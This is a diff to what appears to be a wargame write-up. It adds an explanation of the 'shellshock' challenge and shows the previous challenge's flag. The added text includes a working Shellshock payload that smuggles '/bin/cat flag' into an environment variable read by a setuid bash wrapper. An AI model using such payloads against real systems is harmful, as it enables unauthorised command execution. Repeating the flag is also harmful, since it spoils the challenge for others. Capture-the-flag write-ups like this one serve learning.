@@ -234,7 +234,12 @@ Password OK
 ```Flag : Mommy, the operator priority always confuses me :(```
 
 # Shellshock 
-
+What this program does is pretty simple: it sets the values of his real/effective/set_user user and group id to the value of
+<br>
+his effective group id and then execute a vulnerable version of bash.
+<br>
+In order to exploit it we need to set an environment variable containing a function and the commands we want to execute:
+```READ ABOUT SHELLSHOCK HERE: https://fedoramagazine.org/shellshock-how-does-it-actually-work/```
 ```assembly
 shellshock@ubuntu:~$ export exploit_it="() { :; }; /bin/cat flag;"
 shellshock@ubuntu:~$ ./shellshock 
